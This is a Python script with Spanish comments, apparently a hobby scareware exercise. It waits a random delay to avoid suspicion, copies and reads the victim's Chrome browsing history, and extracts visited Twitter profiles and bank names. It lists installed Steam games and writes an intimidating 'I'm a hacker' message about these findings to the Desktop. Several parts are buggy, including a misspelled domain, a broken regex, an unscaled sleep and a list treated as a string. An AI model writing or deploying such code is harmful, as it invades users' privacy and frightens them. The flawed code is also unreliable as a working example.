import os
import sqlite3
from audioop import reverse
from pathlib import Path
from shutil import copyfile
from time import sleep
from random import randrange
import re
import glob

HACKER_FILE_NAME="PARA TI.txt"


def get_user_path():
    #esta expresion devuelve con la funcion Path.home() el path home del usuario actual
    return "{}/".format(Path.home())


def delay_ation():
    #esta funcion hace un sleep aleatorio entre 1 y 3 horas
    n_hours=randrange(1,4)
    sleep(n_hours) #*60*60)


def create_hacker_file(user_path):
    #esta funcion crea el fichero con una inscripcion dentro y lo devuelve como parametro
    hacker_file = open(user_path+"/Desktop/"+ HACKER_FILE_NAME, "w")
    hacker_file.write("Hola, soy un hacker y me he colado en sistema.\n")
    return hacker_file


def get_chrome_history(user_path):
    urls=None
    while not urls:
        try:
            history_path = user_path + "/Library/Application Support/Google/Chrome/Default/History"
            temp_history= history_path+ "_temp"
            copyfile(history_path, temp_history)
            connection=sqlite3.connect(temp_history)
            cursor= connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls =  cursor.fetchall()
            print(urls)
            connection.close()
            return urls
        except sqlite3.OperationalError:
            sleep(5)


def check_twitter_profiles_and_scare_user (hacker_file,chrome_history):
    profiles_visited = []
    for item in chrome_history:
        results=re.findall("https://twittwer.com/([A-za-z0-0])+$", item[2])
        if results and results[0] not in ["notifications", "home"]:
            profiles_visited.append(results[0])
    if profiles_visited:
        hacker_file.write("he visto que has estado husmeando los en los perfiles de {}...\n".format(", ".join(profiles_visited)))


def check_bank_account (hacker_file,chrome_history):
    his_bank=None
    banks=["BBVA","Caixa", "Santander", "Bankia", "Sabbadell", "Kutxabank", "Abanca", "Unicaja", "Ibercaja"]
    for item in chrome_history:
        for b in banks:
            if b.lower() in item[0].lower():
                his_bank=b
                break
        if his_bank:
            break
    if his_bank:
        hacker_file.write("Además veo que guardas tu dinero en {} Interesante...\n".format(his_bank))


def check_steam_games (hacker_file):
    steam_path="C:\\Program Files (x86)\\Steam\\steamapps\\common"
    games=[]
    games_paths=glob.glob(steam_path)
    games_paths.sort(key=os.path.getmtime, reverse=True)
    for game_path in games_paths:
        games.append(games_paths.split("\\")[-1])
    if games:
        hacker_file.write("He visto que has estado jugando ultimamente a {} Interesante...\n".format(", ".join(games[:3])))


def main():
    #Esperaremos entre 1 y 3 horas para no levantar sospechas
    delay_ation()
    #Construccion del path
    user_path=get_user_path()
    #Recogemos historial de google chrome, cuando sea posible
    chrome_history=get_chrome_history(user_path)
    #Creamos un archivo en el escritorio
    hacker_file=create_hacker_file(user_path)
    #Escribiendo mensajes de miedo
    check_twitter_profiles_and_scare_user(hacker_file,chrome_history)
    check_bank_account(hacker_file, chrome_history)
    check_steam_games(hacker_file)









if __name__ == "__main__":
    main()